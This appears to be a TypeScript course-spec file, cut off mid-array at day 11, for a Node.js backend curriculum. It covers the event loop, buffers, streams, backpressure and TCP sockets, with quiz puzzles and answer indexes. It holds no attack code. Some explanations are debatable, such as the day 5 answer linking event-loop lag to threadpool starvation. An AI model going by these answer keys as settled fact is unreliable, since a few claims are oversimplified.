// scripts/visuals/node-masterclass-spec.ts
// Exhaustive 60-Day Masterclass Specification for Node.js & TypeScript Backend Engineering (course-node-web)
// Total Quests: 240 Quests (Month 1: 120 Quests, Month 2: 120 Quests)
// Conforming strictly to Gate v2 semantic standard, 3-Tier Socratic Hint Ladders, and FAANG/Staff Backend Engineering rubrics.

import { MasterclassDaySpec } from './java-masterclass-spec';

export const NODE_MONTH_1_SPECS: MasterclassDaySpec[] = [
  // ── BLOCK 1: Node.js Architecture, V8 & The Event Loop (Days 1–5) ─────────────
  {
    day: 1,
    month: 1,
    blockNum: 1,
    title: "The Node.js Runtime Architecture: V8 Engine, Libuv C++ Layer & Non-Blocking Asynchronous I/O",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Runtime Internals & Libuv Architecture)",
    spokenGoal: "Deconstruct the Node.js runtime: Understand how Google V8 executes JavaScript, how libuv interfaces with OS kernel non-blocking sockets via epoll/kqueue/IOCP, and why Node.js can handle 10,000 concurrent sockets on a single thread.",
    conceptInvariant: "Node.js runs JavaScript on a single thread. It achieves extreme I/O concurrency not through thread pooling for sockets, but by delegating network socket polling directly to OS kernel event notification mechanisms (epoll on Linux, kqueue on macOS, IOCP on Windows).",
    failureMode: "Executing synchronous CPU-intensive operations (like `crypto.pbkdf2Sync()` or synchronous regex matching) inside an HTTP route handler, starving the event loop and freezing all 10,000 concurrent connections.",
    tryItFriction: "Demonstrate event loop starvation: run a blocking 3-second while loop in one route, prove that concurrent HTTP ping requests to other routes hang, then refactor to asynchronous callbacks.",
    socraticHints: [
      "Why did an HTTP request to `/health` take 3 seconds when another user hit `/heavy-calc`?",
      "Because JavaScript executes on a single thread! While the CPU was busy running the math loop, the event loop could not process the `/health` socket.",
      "Never block the main thread. Offload CPU-heavy calculations to asynchronous worker threads or queue systems."
    ],
    situationalPuzzle: {
      scenario: "A high-traffic e-commerce backend uses Node.js. Under peak load of 5,000 req/sec, CPU utilization hits 100% and response times spike from 10ms to 4,000ms. Profiling reveals that developers used `fs.readFileSync()` to read email templates on every incoming order. What caused the collapse?",
      options: [
        "The server ran out of disk storage space.",
        "Synchronous file I/O blocks the V8 thread: every order request forced the single JavaScript thread to freeze until the disk read completed, creating a massive queue of starved connections.",
        "Node.js does not support SSD drives.",
        "The network card reached its bandwidth limit."
      ],
      answerIdx: 1,
      debrief: "Synchronous file methods block the single JavaScript thread completely. Under 5,000 req/sec, each synchronous disk read stacks up, freezing the entire event loop and causing latency to explode."
    },
    quests: [
      { id: "node-m1-d01-q1", name: "The V8 and Libuv Architecture Topology", type: "concept", desc: "Trace how JavaScript function calls traverse V8, cross Node.js C++ bindings, and schedule I/O polling inside libuv." },
      { id: "node-m1-d01-q2", name: "Detective Lab: The Synchronous Hash Event Loop Freeze", type: "detective", desc: "Isolate a production outage where synchronous password hashing blocked health check pings across a Kubernetes cluster." },
      { id: "node-m1-d01-q3", name: "Mastery Assignment: High-Resolution Event Loop Latency Monitor", type: "assignment", desc: "Build an event loop lag monitor using `perf_hooks.monitorEventLoopDelay()` tracking p50, p95, and p99 latency histograms." },
      { id: "node-m1-d01-q4", name: "Production Incident Lab: Thread-Per-Request vs Event-Driven Benchmarks", type: "detective", desc: "Analyze Apache/Tomcat thread stack memory consumption (1MB per thread) versus Node.js C10K event-driven efficiency." }
    ]
  },
  {
    day: 2,
    month: 1,
    blockNum: 1,
    title: "The Libuv Event Loop Phases: Timers, Poll, Check (setImmediate) & Close Callbacks",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Event Loop Phases & Scheduling Invariants)",
    spokenGoal: "Master the exact phases of the libuv event loop: Timers (`setTimeout`), Pending callbacks, Idle/Prepare, Poll (incoming I/O), Check (`setImmediate`), and Close callbacks, and predict exact callback execution order.",
    conceptInvariant: "The event loop cycles through distinct phases in strict order: Timers -> Pending -> Idle -> Poll -> Check -> Close. Inside an I/O callback (Poll phase), `setImmediate()` will ALWAYS execute before `setTimeout(fn, 0)` because the loop enters the Check phase immediately after Poll.",
    failureMode: "Assuming `setTimeout(fn, 0)` runs in 0ms: the operating system timer resolution clamps timeouts to a minimum of 1ms, causing non-deterministic execution order when called outside an I/O cycle.",
    tryItFriction: "Write a script demonstrating non-deterministic execution of `setTimeout` vs `setImmediate` at top-level, then nest both inside `fs.readFile` to prove `setImmediate` always wins deterministically.",
    socraticHints: [
      "Why did `setImmediate` run before `setTimeout(fn, 0)` inside `fs.readFile`?",
      "Because `fs.readFile` completes in the Poll phase! The very next phase after Poll is Check, where `setImmediate` lives.",
      "The loop must complete the entire cycle before reaching the Timers phase again on the next tick."
    ],
    situationalPuzzle: {
      scenario: "An interview candidate is asked: 'If you want to schedule a callback to run immediately after the current I/O cycle completes without starving other incoming network requests, which API should you use?'",
      options: [
        "process.nextTick()",
        "setImmediate()",
        "setTimeout(fn, 0)",
        "setInterval(fn, 1)"
      ],
      answerIdx: 1,
      debrief: "setImmediate() queues callbacks in the Check phase of the event loop. It runs after the Poll phase and allows subsequent event loop ticks to process other incoming I/O events, unlike nextTick which can starve the loop."
    },
    quests: [
      { id: "node-m1-d02-q1", name: "The 6 Libuv Event Loop Phases Topology", type: "concept", desc: "Map the cyclical phase progression: Timers -> Pending I/O -> Idle/Prepare -> Poll -> Check -> Close Callbacks." },
      { id: "node-m1-d02-q2", name: "Detective Lab: The Non-Deterministic Timer Mystery", type: "detective", desc: "Explain why top-level setTimeout vs setImmediate order fluctuates based on CPU clock ticks and OS timer quantization." },
      { id: "node-m1-d02-q3", name: "Mastery Assignment: Deterministic Event Loop Phase Trace Suite", type: "assignment", desc: "Author an automated test harness that deterministically asserts phase execution order across timers, poll, and check." },
      { id: "node-m1-d02-q4", name: "Production Incident Lab: Close Callbacks & Socket Teardown Leaks", type: "detective", desc: "Diagnose an unreleased TCP socket descriptor leak caused by missing socket close event listeners." }
    ]
  },
  {
    day: 3,
    month: 1,
    blockNum: 1,
    title: "Microtask Queue Priority: process.nextTick vs Promise.then & Event Loop Starvation",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Microtasks & Queue Starvation)",
    spokenGoal: "Master microtask queues in Node.js: Learn how `process.nextTick` and `Promise.then` execute immediately after the current operation finishes (before transitioning to the next event loop phase), and understand the fatal risk of recursive nextTick starvation.",
    conceptInvariant: "The Microtask queue is NOT part of libuv; it is managed directly by Node.js and V8. Microtasks are drained completely after the call stack empties and before libuv transitions to any other phase. `process.nextTick` has higher priority than Promise microtasks.",
    failureMode: "Calling `process.nextTick()` recursively inside a loop: Node.js will continuously drain the nextTick queue, NEVER advancing the libuv event loop, completely starving all network I/O and timers.",
    tryItFriction: "Create a recursive `process.nextTick` function, verify that a pending `setTimeout` timer NEVER fires, then fix the starvation by switching to `setImmediate`.",
    socraticHints: [
      "Why didn't our 10ms timer fire even though 5 seconds passed?",
      "Because `process.nextTick` queues work into the microtask queue, which Node drains completely before moving to the Timers phase!",
      "Replace recursive nextTick with `setImmediate` so the event loop can turn and process timers and I/O."
    ],
    situationalPuzzle: {
      scenario: "A developer writes an asynchronous recursive batch processor using `process.nextTick(processBatch)`. While processing a 100,000-record batch, all incoming HTTP connections to the server time out. Why?",
      options: [
        "The database crashed.",
        "Event loop starvation: Recursive `process.nextTick` calls continuously fill the microtask queue, preventing the event loop from ever reaching the Poll phase to accept incoming TCP connections.",
        "HTTP connections require multithreading.",
        "The memory heap ran out of space."
      ],
      answerIdx: 1,
      debrief: "Node.js exhausts the entire nextTick queue before advancing to the next libuv phase. Recursive nextTick calls starve the event loop indefinitely, preventing new I/O events, timers, and TCP connections from processing."
    },
    quests: [
      { id: "node-m1-d03-q1", name: "The Microtask vs Macrotask Queue Hierarchy", type: "concept", desc: "Trace priority: Call Stack -> nextTickQueue -> promiseMicrotaskQueue -> libuv Phase Macrotask." },
      { id: "node-m1-d03-q2", name: "Detective Lab: The Infinite nextTick Starvation Outage", type: "detective", desc: "Resolve a critical outage where a recursive logging utility froze an entire payment processing cluster." },
      { id: "node-m1-d03-q3", name: "Mastery Assignment: Starvation-Proof Cooperative Task Batcher", type: "assignment", desc: "Build an asynchronous batch task runner that processes 50,000 items while yielding to I/O every 5ms using setImmediate." },
      { id: "node-m1-d03-q4", name: "Production Incident Lab: Promise Unhandled Rejection Termination", type: "detective", desc: "Enforce process.on('unhandledRejection') crash invariants to prevent silent state corruption in production." }
    ]
  },
  {
    day: 4,
    month: 1,
    blockNum: 1,
    title: "JavaScript Memory Buffer Architecture: Buffer.alloc, Buffer.from, Binary Encodings & Memory Slices",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Raw Memory, Buffers & Byte Arrays)",
    spokenGoal: "Master the Node.js Buffer engine: Understand how Buffers allocate raw binary memory outside the V8 V8 heap in C++ memory spaces, the critical difference between `Buffer.alloc` and `Buffer.allocUnsafe`, and how buffer slices share memory references.",
    conceptInvariant: "Buffers represent raw binary memory allocated outside the V8 garbage-collected heap. Slicing a buffer (`buf.subarray()` or `buf.slice()`) does NOT copy memory; it creates a new view pointing to the SAME underlying ArrayBuffer. Mutating a slice mutates the original buffer.",
    failureMode: "Using `Buffer.allocUnsafe()` without immediately filling it with data: the allocated memory contains old unzeroed RAM bytes, potentially leaking sensitive passwords or database secrets over the network.",
    tryItFriction: "Demonstrate that `Buffer.allocUnsafe(100)` contains leaked leftover memory bytes, while `Buffer.alloc(100)` safely zeroes all bytes, and prove that slice mutations mutate the parent buffer.",
    socraticHints: [
      "Why did `Buffer.allocUnsafe(50)` print strange characters and fragments of old code?",
      "Because `allocUnsafe` skips zero-filling for speed! It gives you raw uninitialized RAM containing whatever was previously stored there.",
      "Always use `Buffer.alloc()` for security, or immediately overwrite every byte if using `allocUnsafe`."
    ],
    situationalPuzzle: {
      scenario: "A banking API slices a 10MB uploaded document buffer to extract a 100-byte transaction reference ID: `const ref = documentBuf.subarray(0, 100)`. The API saves `ref` in a global cache and discards `documentBuf`. Why does memory profiling show that the entire 10MB remains locked in RAM?",
      options: [
        "V8 has a memory leak bug.",
        "Buffer slicing creates a view over the existing ArrayBuffer. As long as the small 100-byte slice is referenced in the cache, the entire underlying 10MB parent memory buffer CANNOT be garbage collected.",
        "Buffers cannot be cached.",
        "The operating system locked the file."
      ],
      answerIdx: 1,
      debrief: "A buffer slice shares the parent ArrayBuffer. If you retain a tiny slice of a massive buffer in memory, the entire parent buffer is retained. To detach it, create an independent copy: `Buffer.from(buf.subarray(0, 100))`."
    },
    quests: [
      { id: "node-m1-d04-q1", name: "The Node.js Buffer Memory Model Specification", type: "concept", desc: "Examine C++ ArrayBuffer allocation, V8 external memory limits, Buffer.poolSize (8KB pool), and byte representations." },
      { id: "node-m1-d04-q2", name: "Detective Lab: The allocUnsafe Memory Disclosure Leak", type: "detective", desc: "Isolate a security vulnerability where uninitialized buffer allocations leaked JWT tokens in API responses." },
      { id: "node-m1-d04-q3", name: "Mastery Assignment: Binary Protocol Packet Encoder & Decoder", type: "assignment", desc: "Build a binary packet parser encoding magic bytes, payload lengths, opcode flags, and UTF-8 strings into buffers." },
      { id: "node-m1-d04-q4", name: "Production Incident Lab: Sliced Buffer Retainer Memory Leak", type: "detective", desc: "Diagnose an enterprise heap explosion caused by retaining tiny slices of 50MB uploaded image buffers in memory." }
    ]
  },
  {
    day: 5,
    month: 1,
    blockNum: 1,
    title: "Milestone 1: Event Loop Phase Telemetry & High-Resolution CPU/Memory Monitor",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Runtime Telemetry & Phase Verification)",
    spokenGoal: "Build and defend Milestone 1: A production runtime telemetry daemon monitoring event loop lag histograms, active libuv handles/requests (`process._getActiveHandles()`), V8 heap statistics, and phase execution order.",
    conceptInvariant: "Backend observability starts with runtime health. Telemetry collectors must measure event loop delay using high-resolution timers (`process.hrtime.bigint()`) without introducing significant overhead or mutating runtime state.",
    failureMode: "Allowing a monitoring script to consume more than 0.5% CPU or leaking timers in the active handles list, distorting the very metrics it seeks to measure.",
    tryItFriction: "Implement a low-overhead telemetry sampler emitting p50, p90, p99 event loop lag every 1,000ms, asserting zero memory accumulation over 100,000 samples.",
    socraticHints: [
      "How do we measure event loop lag accurately?",
      "Use `perf_hooks.monitorEventLoopDelay({ resolution: 20 })`. It samples event loop delay at the native C++ libuv level with near-zero JS overhead.",
      "Avoid scheduling frequent setInterval timers which add their own delay to the queue."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 1 defense, a stress test bombards your server with 10,000 concurrent HTTP connections. Your telemetry monitor reports p99 event loop delay of 850ms, while CPU usage is only 15%. What does this indicate?",
      options: [
        "The CPU is broken.",
        "Thread pool starvation: The event loop is blocked waiting for asynchronous operations that consume libuv worker threads (such as DNS lookups or crypto) because UV_THREADPOOL_SIZE is set to default 4.",
        "The server needs more disk space.",
        "Node.js has reached its maximum connections limit."
      ],
      answerIdx: 1,
      debrief: "Low CPU usage combined with massive event loop lag points to thread pool starvation. By default, libuv has only 4 worker threads. Heavy crypto, file I/O, or DNS queries queue up, causing high latency while CPU cores sit idle."
    },
    quests: [
      { id: "node-m1-d05-q1", name: "Milestone 1 Specification & Telemetry Architecture", type: "concept", desc: "Design the high-resolution metrics collection architecture for event loop lag, V8 heap, and libuv handle tracking." },
      { id: "node-m1-d05-q2", name: "Detective Lab: The Observer Effect Telemetry Spike", type: "detective", desc: "Fix a monitoring script that caused 20ms event loop spikes by running synchronous JSON stringification inside timers." },
      { id: "node-m1-d05-q3", name: "Mastery Assignment: Production Runtime Telemetry Daemon", type: "assignment", desc: "Deliver the complete runtime telemetry engine with percentile histograms, memory telemetry, and Prometheus formatting." },
      { id: "node-m1-d05-q4", name: "Milestone 1 Defense: Runtime Architecture & Event Loop Viva", type: "detective", desc: "Defend your event loop telemetry data, microtask priorities, and buffer memory bounds before Senior Staff." }
    ]
  },

  // ── BLOCK 2: File Systems, Streams & Backpressure (Days 6–10) ─────────────────
  {
    day: 6,
    month: 1,
    blockNum: 2,
    title: "Asynchronous File System Engineering: fs/promises, File Descriptors & Atomic Writes",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (File Systems & Atomic File Operations)",
    spokenGoal: "Master production file system engineering: Learn how `fs/promises` executes via the libuv thread pool, how to manage POSIX file descriptors (`fs.open`), and how to implement crash-proof atomic writes using temp files and atomic rename.",
    conceptInvariant: "Writing directly to a target file (`fs.writeFile('data.json', ...)` ) is NOT crash-safe. If the server crashes or loses power halfway through writing, the file is permanently corrupted. Atomic writes write to a temporary file first, flush to disk via `fsync`, and execute an atomic `rename`.",
    failureMode: "Updating a configuration file in place: a server crash mid-write leaves an empty 0-byte or half-written JSON file, preventing the server from ever rebooting.",
    tryItFriction: "Implement an atomic file writer: write 10MB of JSON to a unique temporary file, call `handle.sync()` to flush OS disk caches, and atomically rename it over the destination file.",
    socraticHints: [
      "Why did our database file get corrupted when the server rebooted unexpectedly?",
      "Because the write was non-atomic! Half the bytes were in flight when the power cut off.",
      "Write to a temporary file (`file.tmp`), call `fsync`, then use `fs.rename` which is an atomic filesystem operation on POSIX."
    ],
    situationalPuzzle: {
      scenario: "An enterprise service writes 500 log files per second using `fs.promises.open('log.txt', 'a')`. After running for 10 minutes, all file operations throw: `EMFILE: too many open files`. Why?",
      options: [
        "The hard drive is full.",
        "File descriptor leak: Code opened file handles via `fs.open()` but failed to call `handle.close()` in a finally block, exhausting the operating system's maximum file descriptor limit.",
        "Node.js only allows 10 files open at once.",
        "The file system requires defragmentation."
      ],
      answerIdx: 1,
      debrief: "Every call to fs.open allocates an OS file descriptor. If you do not close the file handle in a `finally` block or use automatic handle disposal, file descriptors accumulate until the OS limit (`ulimit -n`) is reached, throwing EMFILE."
    },
    quests: [
      { id: "node-m1-d06-q1", name: "The POSIX File Descriptor Lifecycle Topology", type: "concept", desc: "Trace file operations: open -> read/write -> fsync (flushing disk write buffer) -> close -> inode rename." },
      { id: "node-m1-d06-q2", name: "Detective Lab: The EMFILE Too Many Open Files Crash", type: "detective", desc: "Diagnose an unclosed file handle leak in an asynchronous batch image processor and enforce auto-closing." },
      { id: "node-m1-d06-q3", name: "Mastery Assignment: Crash-Proof Atomic File Persistence Store", type: "assignment", desc: "Build an atomic key-value JSON storage engine with temp-file writes, fsync guarantees, and write-ahead locks." },
      { id: "node-m1-d06-q4", name: "Production Incident Lab: Partial Writes & Corrupted Configuration Post-Mortem", type: "detective", desc: "Analyze an enterprise outage where a non-atomic config write corrupted server configuration during rolling reboots." }
    ]
  },
  {
    day: 7,
    month: 1,
    blockNum: 2,
    title: "Node.js Streaming Architecture: Readable, Writable, Duplex & Transform Streams",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Stream Types & Chunked Processing)",
    spokenGoal: "Master the Node.js Stream architecture: Learn why streams are the foundation of high-performance backend systems, contrast the 4 fundamental stream types (Readable, Writable, Duplex, Transform), and process infinite data chunks with tiny memory footprints.",
    conceptInvariant: "Streams process data in chunks over time rather than loading entire payloads into memory. Processing a 10GB file with streams requires only ~64KB of RAM, whereas loading it with `fs.readFile()` will instantly crash Node.js with an Out-of-Memory heap overflow.",
    failureMode: "Reading a 2GB database dump into memory with `fs.readFile()`: V8's default 1.4GB heap limit is exceeded, immediately crashing the process with `JavaScript heap out of memory`.",
    tryItFriction: "Convert an out-of-memory `fs.readFile()` script that processes a 500MB log file into a chunked `Readable` stream with a custom `Transform` stream, proving memory usage remains under 30MB.",
    socraticHints: [
      "Why did the server crash when an enterprise client uploaded a 1.8GB file?",
      "You called `fs.readFile()`! It tried to allocate a contiguous 1.8GB string in V8 heap, exceeding the memory limit.",
      "Use `fs.createReadStream()` to pipe chunks one by one through a Transform stream with zero memory accumulation."
    ],
    situationalPuzzle: {
      scenario: "An engineer builds a real-time log anonymizer. Incoming logs are encrypted chunks; outgoing logs must be plain text. Which Node.js stream class should be extended to modify data as it passes through?",
      options: [
        "stream.Readable",
        "stream.Writable",
        "stream.Transform",
        "stream.PassThrough"
      ],
      answerIdx: 2,
      debrief: "A Transform stream is a Duplex stream where the output is computed directly from the input. It implements a `_transform(chunk, encoding, callback)` method to mutate, filter, or encrypt chunks in-flight."
    },
    quests: [
      { id: "node-m1-d07-q1", name: "The 4 Core Stream Interfaces Specification", type: "concept", desc: "Examine internal events and methods: Readable (_read, 'data', 'end'), Writable (_write, 'drain', 'finish'), Duplex, Transform." },
      { id: "node-m1-d07-q2", name: "Detective Lab: The JavaScript Heap Out of Memory Crash", type: "detective", desc: "Profile a memory crash caused by buffering a 1.2GB video export and refactor to streaming chunk pipelines." },
      { id: "node-m1-d07-q3", name: "Mastery Assignment: Custom Encryption & Decryption Transform Stream", type: "assignment", desc: "Build a streaming AES-256-GCM cipher Transform stream with authentication tag verification on final flush." },
      { id: "node-m1-d07-q4", name: "Production Incident Lab: Paused vs Flowing Mode Invariant Violations", type: "detective", desc: "Understand how attaching a 'data' listener switches Readable streams to flowing mode and how to avoid unhandled chunks." }
    ]
  },
  {
    day: 8,
    month: 1,
    blockNum: 2,
    title: "Stream Backpressure Mechanics: HighWaterMark, .write() Boolean Returns & drain Events",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Backpressure & Buffer Management)",
    spokenGoal: "Master stream backpressure: Understand what happens when a fast Readable produces data faster than a slow Writable can consume it, how the `highWaterMark` buffer threshold triggers backpressure, and how to pause reading until the `drain` event fires.",
    conceptInvariant: "When writing to a stream, `writable.write(chunk)` returns a BOOLEAN. If it returns `false`, the internal buffer has exceeded `highWaterMark`! The producer MUST pause reading until the consumer empties its buffer and emits the `'drain'` event.",
    failureMode: "Ignoring the return value of `writable.write()` in a loop: chunks accumulate indefinitely in Node.js internal memory queues, causing an invisible, rapid memory leak that crashes the server.",
    tryItFriction: "Write a high-speed data generator writing to a slow disk stream: respect the `false` return of `write()`, pause generation, listen for `'drain'`, and resume cleanly without memory spikes.",
    socraticHints: [
      "Why did memory usage climb to 1.5GB while piping data to a slow network socket?",
      "The fast file stream read data at 100MB/s, but the slow socket could only write at 1MB/s! Because backpressure was ignored, 1.4GB buffered in RAM.",
      "Check `if (!writable.write(chunk)) readable.pause();`. When the socket drains, resume reading on `'drain'`."
    ],
    situationalPuzzle: {
      scenario: "A video streaming server reads video files from local NVMe SSD (fast) and writes them to a user connected via 2G cellular network (slow). The developer writes: `readStream.on('data', chunk => clientSocket.write(chunk))`. What critical production failure occurs?",
      options: [
        "The video plays too quickly for the user.",
        "Uncontrolled buffer growth: Because backpressure is ignored, the fast SSD stream reads the entire 2GB file into Node.js internal socket write queues, consuming all server RAM and crashing the process.",
        "The client socket closes immediately.",
        "The 2G connection automatically upgrades to 5G."
      ],
      answerIdx: 1,
      debrief: "Manual 'data' listeners bypass built-in stream backpressure handling. When reading from a fast source to a slow destination, unconsumed chunks pile up in memory queues, causing massive heap bloat and Out-Of-Memory termination."
    },
    quests: [
      { id: "node-m1-d08-q1", name: "The Backpressure Signaling State Machine", type: "concept", desc: "Diagram the backpressure cycle: write() -> false -> internal buffer full -> pause() -> drain event -> resume()." },
      { id: "node-m1-d08-q2", name: "Detective Lab: The Unchecked write() Memory Leak", type: "detective", desc: "Locate and fix a catastrophic memory leak in a custom proxy service that ignored backpressure signals." },
      { id: "node-m1-d08-q3", name: "Mastery Assignment: Manual Backpressure Loop Implementation", type: "assignment", desc: "Construct a manual stream pump function handling highWaterMark, pause/resume, and drain without using .pipe()." },
      { id: "node-m1-d08-q4", name: "Production Incident Lab: TCP Socket Send Buffer Flooding Post-Mortem", type: "detective", desc: "Inspect OS-level SO_SNDBUF socket queues and observe how libuv signals backpressure to the Node.js runtime." }
    ]
  },
  {
    day: 9,
    month: 1,
    blockNum: 2,
    title: "Safe Stream Pipelines: stream.pipeline, Error Propagation & Resource Cleanup",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Safe Pipelines & Resource Destruction)",
    spokenGoal: "Master safe stream pipelining: Learn why legacy `readable.pipe(writable)` is considered hazardous in production due to broken error propagation, and how `stream.pipeline()` and `stream/promises` guarantee proper error handling and automatic descriptor cleanup.",
    conceptInvariant: "Legacy `.pipe()` does NOT destroy destination streams when the source stream errors, causing lingering file descriptors and memory leaks. Modern Node.js mandates `stream.pipeline()`, which guarantees that if ANY stream in the pipeline fails, all streams are cleanly destroyed.",
    failureMode: "Using `readStream.pipe(gzipStream).pipe(writeStream)`: if the source stream throws an error, `writeStream` stays open indefinitely, locking the file on disk and leaking resources.",
    tryItFriction: "Refactor a broken `.pipe()` chain into `await stream.promises.pipeline(read, transform, write)` inside a try/catch block, verifying that all streams are destroyed on intentional error injection.",
    socraticHints: [
      "Why did the destination file remain locked on disk when the download failed halfway?",
      "In legacy `.pipe()`, errors in the source stream do NOT automatically close the destination stream!",
      "Use `await pipeline(src, dest)`. It automatically closes all streams and rejects the promise on any error."
    ],
    situationalPuzzle: {
      scenario: "An enterprise file ingestion pipeline decompresses and parses uploaded zip files. An attacker uploads a corrupted zip payload. The decompression stream emits an 'error' event. Because legacy `.pipe()` was used without an error listener on every intermediate stream, what happens to the Node.js process?",
      options: [
        "The error is silently ignored.",
        "Uncaught Exception Crash: In Node.js, an unhandled 'error' event on ANY EventEmitter or Stream throws an uncaught exception, immediately crashing the entire Node.js server process.",
        "The file is repaired automatically.",
        "The stream restarts."
      ],
      answerIdx: 1,
      debrief: "Streams are EventEmitters. In Node.js, if an EventEmitter emits an 'error' event with no registered error handler, the runtime treats it as an uncaught fatal exception and terminates the entire process. `stream.pipeline` solves this by forwarding all errors to a single handler."
    },
    quests: [
      { id: "node-m1-d09-q1", name: "The stream.pipeline Destruction Protocol", type: "concept", desc: "Trace how pipeline attaches listeners to 'error', 'close', and 'finish' to invoke .destroy(err) across all chain members." },
      { id: "node-m1-d09-q2", name: "Detective Lab: The Unhandled Stream Error Crash Outage", type: "detective", desc: "Isolate a fatal production crash caused by an unhandled gzip decompression error in an API file upload route." },
      { id: "node-m1-d09-q3", name: "Mastery Assignment: Resilient Multi-Stage File Transformation Pipeline", type: "assignment", desc: "Build a production pipeline: Read File -> Decompress (Brotli) -> Decrypt -> Transform (JSON Parser) -> Database Sink." },
      { id: "node-m1-d09-q4", name: "Production Incident Lab: File Descriptor Leaks via Unclosed Destinations", type: "detective", desc: "Prove using lsof / Process Explorer that legacy pipe leaks file descriptors on network disconnections." }
    ]
  },
  {
    day: 10,
    month: 1,
    blockNum: 2,
    title: "Milestone 2: Resilient Multi-Gigabyte CSV Stream Processing & Transform Engine",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (High-Scale Stream Engineering)",
    spokenGoal: "Build and defend Milestone 2: A production-grade streaming ingestion engine capable of parsing, validating, normalizing, and calculating rolling analytics over a 5GB CSV dataset (10,000,000 rows) with strict backpressure and memory capped below 50MB RAM.",
    conceptInvariant: "Enterprise data ingestors must stream chunks through backpressure-guarded transform pipelines, handle fragmented line boundaries without splitting multi-byte UTF-8 sequences, and recover gracefully from corrupted input rows.",
    failureMode: "Exceeding the 50MB RAM memory budget during ingestion, indicating that backpressure was breached or parsed row objects were accidentally accumulated in an unbounded array.",
    tryItFriction: "Ingest a 2GB simulated transaction CSV: assert that process memory stays flat at 35MB throughout the entire 60-second processing run and that 100% of rows are validated.",
    socraticHints: [
      "Why did memory usage spike when parsing lines?",
      "You split chunks by `\n` without buffering the trailing fragment! Chunks can cut words and numbers in half across chunk boundaries.",
      "Buffer trailing incomplete lines into the next chunk pass, and write parsed records immediately to the output sink."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 2 review, a corrupted row with 4 columns instead of 5 appears in the middle of a 10-million row file. How must your streaming pipeline handle this?",
      options: [
        "Crash the entire process and wipe the database.",
        "Isolate and divert: The Transform stream catches the validation error, routes the malformed row to a dedicated 'dead-letter' error stream with line number context, and continues processing subsequent valid rows without halting.",
        "Guess the missing column value.",
        "Skip the next 1,000 rows."
      ],
      answerIdx: 1,
      debrief: "Production streaming ingestors must be fault-tolerant. Malformed rows are intercepted and diverted to a Dead-Letter Queue (DLQ) or error log stream, preserving the integrity of the main pipeline while continuing to process valid data."
    },
    quests: [
      { id: "node-m1-d10-q1", name: "Milestone 2 Architecture & Stream Pipeline Specification", type: "concept", desc: "Design the chunked streaming architecture: File Source -> Line Splitter -> Schema Validator -> Normalizer -> Sink." },
      { id: "node-m1-d10-q2", name: "Detective Lab: The Fragmented Line UTF-8 Split Bug", type: "detective", desc: "Debug an issue where a multibyte Unicode character was split across two 64KB chunks, corrupting customer names." },
      { id: "node-m1-d10-q3", name: "Mastery Assignment: 10-Million Row Streaming Ingestion Engine", type: "assignment", desc: "Deliver the full CSV streaming engine with backpressure guarantees, dead-letter routing, and sub-50MB RAM usage." },
      { id: "node-m1-d10-q4", name: "Milestone 2 Defense: Stream Mechanics & Backpressure Auditing Viva", type: "detective", desc: "Defend your stream pipeline architecture, memory limits, and error recovery before Senior Systems Architects." }
    ]
  },

  // ── BLOCK 3: Networking, HTTP Core & REST Architecture (Days 11–15) ───────────
  {
    day: 11,
    month: 1,
    blockNum: 3,
    title: "TCP Socket Server Foundations: The net Module, Keep-Alive & Socket Lifecycle",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (TCP Networking & Socket Management)",
    spokenGoal: "Master raw TCP networking with Node's `net` module: Understand the 3-way TCP handshake, socket file descriptors, TCP Keep-Alive (`socket.setKeepAlive`), connection backlogs, and socket lifecycle events (`connect`, `data`, `drain`, `end`, `close`).",
    conceptInvariant: "HTTP is merely a text protocol layered on top of a raw bidirectional TCP byte stream. A TCP socket is a Duplex stream. Calling `socket.end()` sends a FIN packet (half-closing write), while `socket.destroy()` forcibly resets the connection with an RST packet.",
    failureMode: "Failing to set idle socket timeouts (`socket.setTimeout()`): clients open TCP connections and send nothing, exhausting the server's open file descriptor limits and blocking new users (Slowloris attack).",
    tryItFriction: "Build a raw TCP echo server using `net.createServer()`: configure 30-second idle timeouts, handle abrupt client disconnects without unhandled errors, and track active connection counts.",
    socraticHints: [
      "Why did the server crash with `ECONNRESET` when a client abruptly closed their terminal?",
      "The client terminated without a graceful FIN handshake. When your server tried writing to the dead socket, the OS threw ECONNRESET!",
      "Always attach an `'error'` event listener to raw TCP sockets to handle abrupt connection resets gracefully."
    ],
    situationalPuzzle: {
      scenario: "A security scanner executes a Slowloris attack: it opens 2,000 TCP sockets to your server and transmits 1 byte every 29 seconds. All normal users receive connection refused errors. How do you defend the TCP server?",
      options: [
        "Buy more RAM.",
        "Implement aggressive TCP idle timeouts (`server.headersTimeout` and `socket.setTimeout(5000)`), and cap the maximum number of concurrent open connections per IP address.",
        "Disable TCP.",
        "Switch to HTTP 1.0."
      ],
      answerIdx: 1,
      debrief: "Slowloris exploits idle open sockets. Defending against it requires configuring strict socket timeouts (closing sockets that don't transmit full requests within a few seconds) and rate-limiting concurrent open connections per IP."
    },
    quests: [
      { id: "node-m1-d11-q1", name: "The TCP 3-Way Handshake & Socket State Topology", type: "concept", desc: "Trace TCP states: LISTEN -> SYN-RECEIVED -> ESTABLISHED -> FIN-WAIT -> CLOSE-WAIT -> TIME-WAIT." },
      { id: "node-m1-d11-q2", name: "Detective Lab: The Unhandled ECONNRESET Crash Outage", type: "detective", desc: "Fix an issue where mobile client network dropouts crashed the backend server due to unhandled socket error events." },
